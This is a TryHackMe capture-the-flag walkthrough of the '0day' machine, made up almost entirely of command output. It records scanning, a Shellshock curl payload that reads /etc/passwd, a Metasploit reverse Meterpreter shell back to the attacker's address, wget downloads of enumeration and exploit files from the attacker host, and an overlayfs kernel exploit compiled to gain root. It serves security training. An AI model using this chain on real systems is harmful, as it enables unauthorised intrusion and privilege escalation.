---
title: 0day
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the 0day machine
  on TryHackMe.
slug: 0day
---




```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-title: 0day
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /backup/: Possible backup
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /secret/: Potentially interesting folder
|_  /uploads/: Potentially interesting folder
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
 nikto --url http://10.201.104.255/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.201.104.255
+ Target Hostname:    10.201.104.255
+ Target Port:        80
+ Start Time:         2025-10-10 16:14:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271


```


```
/index.htmlindex.html           (Status: 200) [Size: 3025]
/cgi-bincgi-bin              (Status: 301) [Size: 317] [--> http://10.201.104.255/cgi-bin/]
/imgimg                  (Status: 301) [Size: 313] [--> http://10.201.104.255/img/]
/uploadsuploads              (Status: 301) [Size: 317] [--> http://10.201.104.255/uploads/]
/adminadmin                (Status: 301) [Size: 315] [--> http://10.201.104.255/admin/]
/csscss                  (Status: 301) [Size: 313] [--> http://10.201.104.255/css/]
/jsjs                   (Status: 301) [Size: 312] [--> http://10.201.104.255/js/]
/backupbackup               (Status: 301) [Size: 316] [--> http://10.201.104.255/backup/]
/robots.txtrobots.txt           (Status: 200) [Size: 38]
```

```
/test.cgi             (Status: 200) [Size: 13]
```


```

❯ curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://10.201.104.255/cgi-bin/test.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin

```


```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) >

```

```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhosts tun0
[!] Unknown datastore option: lhosts. Did you mean RHOSTS?
lhosts => tun0
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 10.201.73.124
rhosts => 10.201.73.124
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.cgi
TARGETURI => /cgi-bin/test.cgi
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 10.201.73.124:80 - The target is vulnerable.
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[-] Handler failed to bind to 10.21.16.42:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lport 4443
lport => 4443
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 10.21.16.42:4443 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.201.73.124
[*] Meterpreter session 1 opened (10.21.16.42:4443 -> 10.201.73.124:35627) at 2025-10-10 17:01:24 -0400

meterpreter >

```



```
shell
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
cd /home
ls
ryan

cd ryan
ls
user.txt
cat user.txt

```

> To get root

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

```
www-data@ubuntu:/tmp$ wget http://10.21.16.42:80/LinEnum.sh
wget http://10.21.16.42:80/LinEnum.sh
--2025-10-10 14:07:12--  http://10.21.16.42/LinEnum.sh
Connecting to 10.21.16.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

100%[======================================>] 46,631      42.3KB/s   in 1.1s   

2025-10-10 14:07:13 (42.3 KB/s) - 'LinEnum.sh' saved [46631/46631]

www-data@ubuntu:/tmp$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
www-data@ubuntu:/tmp$ clear
clear
TERM environment variable not set.
www-data@ubuntu:/tmp$ ./LinEnum.sh

```


> and find

```
`[-] Kernel information
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
[-] Kernel information (continued):
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014

```

> So I found vauln

> ` Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation`

> and also i get it to my shell using wget

```
www-data@ubuntu:/tmp$ wget http://10.21.16.42:80/37292.c
wget http://10.21.16.42:80/37292.c
--2025-10-10 14:38:37--  http://10.21.16.42/37292.c
Connecting to 10.21.16.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: '37292.c'

100%[======================================>] 5,119       2.24KB/s   in 2.2s   

2025-10-10 14:38:40 (2.24 KB/s) - '37292.c' saved [5119/5119]


```

> so I run like this

```
www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
<t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 

```

```
www-data@ubuntu:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
www-data@ubuntu:/tmp$ chmod +x exploit
chmod +x exploit
www-data@ubuntu:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt


```